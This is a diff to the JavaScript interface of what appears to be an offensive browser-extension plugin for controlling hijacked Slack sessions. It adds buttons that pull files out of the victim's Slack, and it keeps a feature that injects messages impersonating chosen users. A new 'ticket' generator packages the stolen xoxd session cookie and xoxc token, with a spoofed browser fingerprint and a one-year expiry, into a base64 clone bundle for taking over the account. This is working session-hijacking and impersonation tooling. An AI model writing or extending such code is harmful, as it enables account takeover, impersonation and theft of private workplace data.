@@ -16,9 +16,8 @@ var _refreshTimer = null;
 var _pollTimer = null;
 var _searchPollTimer = null;
 var selectedInjectUser = null;
-var probeData = null;
 var _injectPollTimer = null;
-var _probePollTimer = null;
+var _activeDownloads = {}; // track in-progress file downloads by fileName
 var workspaces = [];
 var activeWorkspaceIndex = 0;
 var _workspaceSwitchTime = 0; // timestamp of last user-initiated switch
@@ -26,6 +25,37 @@ var _workspaceGeneration = 0; // increments on each workspace switch to invalida
 var _switchPending = false; // true while waiting for plugin to confirm workspace switch
 var injectedMessageCount = 0;
 var _clearInjectedPollTimer = null;
+
+function humanFileSize(bytes) {
+    if (!bytes || bytes < 1024) return (bytes || 0) + ' B';
+    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+    return (bytes / 1048576).toFixed(1) + ' MB';
+}
+
+function fileIcon(mimetype) {
+    if (!mimetype) return '\u{1F4CE}'; // paperclip
+    if (mimetype.indexOf('image/') === 0) return '\u{1F5BC}'; // framed picture
+    if (mimetype.indexOf('video/') === 0) return '\u{1F3AC}'; // clapper
+    if (mimetype.indexOf('audio/') === 0) return '\u{1F3B5}'; // music note
+    if (mimetype.indexOf('pdf') !== -1) return '\u{1F4C4}'; // page
+    return '\u{1F4CE}'; // paperclip
+}
+
+function userInitialAvatar(name, userId) {
+    var initial = (name && name.length > 0) ? name.charAt(0).toUpperCase() : '?';
+    // Deterministic color from userId hash
+    var colors = ['#4a7c59','#7c4a6b','#4a5e7c','#7c6b4a','#5a4a7c','#7c4a4a','#4a7c7c','#6b7c4a'];
+    var hash = 0;
+    var id = userId || name || '';
+    for (var i = 0; i < id.length; i++) {
+        hash = ((hash << 5) - hash) + id.charCodeAt(i);
+        hash = hash & hash;
+    }
+    var color = colors[Math.abs(hash) % colors.length];
+    return '<div style="width:24px;height:24px;border-radius:3px;background:' + color +
+        ';display:inline-flex;align-items:center;justify-content:center;color:#fff;font-size:12px;font-weight:bold;margin-right:8px;flex-shrink:0">' +
+        initial + '</div>';
+}
 
 function esc(str) {
     if (str === null || str === undefined) return '';
@@ -243,15 +273,116 @@ function renderMessages() {
 
         var displayName = resolveUserName(msg.user || 'unknown');
 
+        var filesHtml = '';
+        if (msg.files && msg.files.length) {
+            for (var fi = 0; fi < msg.files.length; fi++) {
+                var f = msg.files[fi];
+                filesHtml += '<div class="d-flex align-items-center mt-1" style="padding:4px 8px;background:#3a3f44;border-radius:3px;border-left:3px solid #52565a;gap:6px">' +
+                    '<span>' + fileIcon(f.mimetype) + '</span>' +
+                    '<span class="small" style="color:#fff">' + esc(f.name) + '</span>' +
+                    '<span class="text-muted small">(' + humanFileSize(f.size) + ')</span>';
+                if (f.urlPrivate) {
+                    filesHtml += '<button class="btn btn-outline-secondary btn-sm ms-auto slack-file-dl" ' +
+                        'data-url="' + esc(f.urlPrivate) + '" data-name="' + esc(f.name) + '" data-mime="' + esc(f.mimetype) + '" ' +
+                        'style="padding:1px 6px;font-size:0.7rem;line-height:1.2">Download</button>';
+                }
+                filesHtml += '</div>';
+            }
+        }
+
         html += '<div class="mb-2">' +
             '<span class="fw-bold" style="color:#fff">' + esc(displayName) + '</span>' +
             '<span class="text-muted small ms-2">' + esc(timeStr) + '</span>' +
             '<div class="small' + subtypeClass + '" style="color:#aaa;word-break:break-word">' + formatSlackText(msg.text || '') + '</div>' +
+            filesHtml +
             '</div>';
     }
 
+    // Only auto-scroll if user is already near the bottom (within 80px)
+    var wasNearBottom = (container.scrollHeight - container.scrollTop - container.clientHeight) < 80;
+
     container.innerHTML = html;
-    container.scrollTop = container.scrollHeight;
+
+    if (wasNearBottom) {
+        container.scrollTop = container.scrollHeight;
+    }
+
+    // Wire file download buttons
+    var dlBtns = container.querySelectorAll('.slack-file-dl');
+    for (var di = 0; di < dlBtns.length; di++) {
+        (function(btn) {
+            var name = btn.getAttribute('data-name');
+            // Restore visual state if a download is already in progress for this file
+            if (_activeDownloads[name]) {
+                btn.disabled = true;
+                btn.textContent = _activeDownloads[name];
+            }
+            btn.onclick = function() {
+                if (_activeDownloads[name]) return; // Already downloading
+                var url = btn.getAttribute('data-url');
+                var mime = btn.getAttribute('data-mime');
+                btn.disabled = true;
+                btn.textContent = 'Downloading...';
+                _activeDownloads[name] = 'Downloading...';
+
+                // Snapshot the latest file_download row ID so we only match newer results
+                pluginUI.fetchData('file_download', 1, 0).then(function(snap) {
+                    var snapRows = snap.rows || [];
+                    var lastId = snapRows.length > 0 ? snapRows[0].id : 0;
+
+                    sendCommand({ action: 'download_file', url: url, fileName: name, mimetype: mime });
+
+                    var polls = 0;
+                    var dlTimer = setInterval(function() {
+                        polls++;
+                        if (polls > 60) {
+                            clearInterval(dlTimer);
+                            delete _activeDownloads[name];
+                            var curBtn = container.querySelector('.slack-file-dl[data-name="' + CSS.escape(name) + '"]');
+                            if (curBtn) { curBtn.textContent = 'Timeout'; curBtn.disabled = false; }
+                            return;
+                        }
+                        pluginUI.fetchData('file_download', 5, 0).then(function(result) {
+                            var rows = result.rows || [];
+                            for (var r = 0; r < rows.length; r++) {
+                                var row = rows[r];
+                                var d = row.data || {};
+                                if (d.fileName !== name || row.id <= lastId) continue;
+                                if (d.data) {
+                                    clearInterval(dlTimer);
+                                    var byteChars = atob(d.data);
+                                    var byteArray = new Uint8Array(byteChars.length);
+                                    for (var b = 0; b < byteChars.length; b++) {
+                                        byteArray[b] = byteChars.charCodeAt(b);
+                                    }
+                                    var blob = new Blob([byteArray], { type: d.mimetype || 'application/octet-stream' });
+                                    var a = document.createElement('a');
+                                    a.href = URL.createObjectURL(blob);
+                                    a.download = name;
+                                    document.body.appendChild(a);
+                                    a.click();
+                                    document.body.removeChild(a);
+                                    URL.revokeObjectURL(a.href);
+                                    _activeDownloads[name] = 'Downloaded';
+                                    var curBtn = container.querySelector('.slack-file-dl[data-name="' + CSS.escape(name) + '"]');
+                                    if (curBtn) { curBtn.textContent = 'Downloaded'; curBtn.disabled = false; }
+                                    setTimeout(function() { delete _activeDownloads[name]; }, 3000);
+                                    return;
+                                }
+                                if (d.error) {
+                                    clearInterval(dlTimer);
+                                    delete _activeDownloads[name];
+                                    var curBtn = container.querySelector('.slack-file-dl[data-name="' + CSS.escape(name) + '"]');
+                                    if (curBtn) { curBtn.textContent = 'Error: ' + (d.error || 'unknown'); curBtn.disabled = false; }
+                                    return;
+                                }
+                            }
+                        });
+                    }, 1000);
+                });
+            };
+        })(dlBtns[di]);
+    }
 }
 
 function formatSlackText(text) {
@@ -591,7 +722,7 @@ if (workspaceSelect) {
         renderMessages();
 
         var labelEl = pluginUI.container.querySelector('#slack-inject-selected-user');
-        if (labelEl) labelEl.textContent = 'No user selected';
+        if (labelEl) labelEl.textContent = '1. Search for a sender, 2. Select a channel from the sidebar';
         updateInjectControls();
 
         var statusEl = pluginUI.container.querySelector('#slack-status');
@@ -666,6 +797,81 @@ if (msgInput) {
             e.preventDefault();
             if (sendBtn) sendBtn.click();
         }
+    };
+}
+
+// Generate BEX Conductor ticket
+var ticketBtn = pluginUI.container.querySelector('#slack-ticket-btn');
+if (ticketBtn) {
+    ticketBtn.onclick = function() {
+        if (!credData || !credData.cookie || !credData.token) {
+            alert('No Slack credentials available yet. Wait for sync to complete.');
+            return;
+        }
+
+        // The xoxd- cookie is Slack's "d" session cookie, scoped to .slack.com
+        // The xoxc- token is used by the web client as an API token stored in localStorage
+        var teamDomain = credData.domain || credData.teamName || 'slack';
+        var expiry = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60); // 1 year from now
+
+        var ticket = {
+            version: 1,
+            type: 'clone',
+            generated: new Date().toISOString(),
+            domain: 'app.slack.com',
+            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+            platform: 'Windows',
+            browser: 'Chrome',
+            cookies: [
+                {
+                    name: 'd',
+                    value: credData.cookie,
+                    httpOnly: true,
+                    secure: true,
+                    sameSite: 'lax',
+                    path: '/',
+                    domain: '.slack.com',
+                    expirationDate: expiry
+                },
+                {
+                    name: 'd-s',
+                    value: Math.floor(Date.now() / 1000).toString(),
+                    httpOnly: false,
+                    secure: true,
+                    sameSite: 'lax',
+                    path: '/',
+                    domain: '.slack.com',
+                    expirationDate: expiry
+                }
+            ],
+            headers: [],
+            localStorage: [
+                { key: 'localConfig_v2', value: JSON.stringify({ teams: (function() { var t = {}; t[credData.teamId] = { token: credData.token, name: credData.teamName || '', id: credData.teamId }; return t; })() }) }
+            ],
+            sessionStorage: [],
+            urls: [
+                'https://app.slack.com/client/' + (credData.teamId || ''),
+                'https://app.slack.com/'
+            ]
+        };
+
+        var b64 = btoa(JSON.stringify(ticket));
+        navigator.clipboard.writeText(b64).then(function() {
+            var orig = ticketBtn.textContent;
+            ticketBtn.textContent = 'Copied!';
+            setTimeout(function() { ticketBtn.textContent = orig; }, 2000);
+        }).catch(function() {
+            // Fallback: select from a temporary textarea
+            var ta = document.createElement('textarea');
+            ta.value = b64;
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand('copy');
+            document.body.removeChild(ta);
+            var orig = ticketBtn.textContent;
+            ticketBtn.textContent = 'Copied!';
+            setTimeout(function() { ticketBtn.textContent = orig; }, 2000);
+        });
     };
 }
 
@@ -848,9 +1054,7 @@ function renderInjectUserDropdown(filter) {
         html += '<div class="slack-inject-user-item d-flex align-items-center" data-idx="' + m + '" ' +
             'style="padding:4px 8px;cursor:pointer;border-bottom:1px solid #52565a;color:#aaa" ' +
             'onmouseover="this.style.background=\'#52565a\'" onmouseout="this.style.background=\'\'">';
-        if (u.avatar48) {
-            html += '<img src="' + esc(u.avatar48) + '" style="width:24px;height:24px;border-radius:3px;margin-right:8px">';
-        }
+        html += userInitialAvatar(u.name || u.realName || '', u.id || '');
         html += '<span style="color:#fff">' + esc(u.name || '') + '</span>';
         if (u.realName) {
             html += '<span class="text-muted ms-2 small">' + esc(u.realName) + '</span>';
@@ -890,60 +1094,6 @@ if (injectUserSearch) {
             var dropdown = pluginUI.container.querySelector('#slack-inject-user-dropdown');
             if (dropdown) dropdown.style.display = 'none';
         }, 200);
-    };
-}
-
-// Probe Store button
-var probeBtn = pluginUI.container.querySelector('#slack-probe-btn');
-if (probeBtn) {
-    probeBtn.onclick = function() {
-        var statusEl = pluginUI.container.querySelector('#slack-probe-status');
-        if (statusEl) statusEl.innerHTML = '<span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Probing...';
-        sendCommand({ action: 'probe_store' });
-
-        var polls = 0;
-        if (_probePollTimer) clearInterval(_probePollTimer);
-        _probePollTimer = setInterval(function() {
-            polls++;
-            if (polls > 30) {
-                clearInterval(_probePollTimer);
-                _probePollTimer = null;
-                if (statusEl) statusEl.textContent = 'Timed out';
-                return;
-            }
-            pluginUI.fetchData('store_probe', 5, 0).then(function(result) {
-                var rows = result.rows || [];
-                if (rows.length > 0) {
-                    probeData = rows[0].data || {};
-                    clearInterval(_probePollTimer);
-                    _probePollTimer = null;
-                    if (statusEl) {
-                        statusEl.innerHTML = probeData.storeFound ?
-                            '<span class="text-muted">Store found: ' + esc(probeData.storeLocation || '?') + '</span>' :
-                            '<span class="text-muted">Store not found</span>';
-                    }
-                    // Show probe results panel
-                    var panel = pluginUI.container.querySelector('#slack-probe-results-panel');
-                    var pre = pluginUI.container.querySelector('#slack-probe-results');
-                    if (panel) panel.style.display = '';
-                    if (pre) pre.textContent = JSON.stringify(probeData, null, 2);
-                }
-            });
-        }, 1000);
-    };
-}
-
-// Probe results toggle
-var probeToggle = pluginUI.container.querySelector('#slack-probe-toggle');
-if (probeToggle) {
-    probeToggle.onclick = function(e) {
-        e.preventDefault();
-        var pre = pluginUI.container.querySelector('#slack-probe-results');
-        if (pre) {
-            var hidden = pre.style.display === 'none';
-            pre.style.display = hidden ? '' : 'none';
-            probeToggle.textContent = hidden ? 'Hide probe results' : 'Show probe results';
-        }
     };
 }
 
@@ -1042,6 +1192,8 @@ if (clearInjectedBtn) {
                 }
                 return;
             }
+            // Force a loadData refresh so injectedMessageCount stays current
+            loadData();
             // Early success: if injectedMessageCount already dropped to 0 via loadData refresh
             if (injectedMessageCount === 0 && _preClearCount > 0) {
                 clearInterval(_clearInjectedPollTimer);
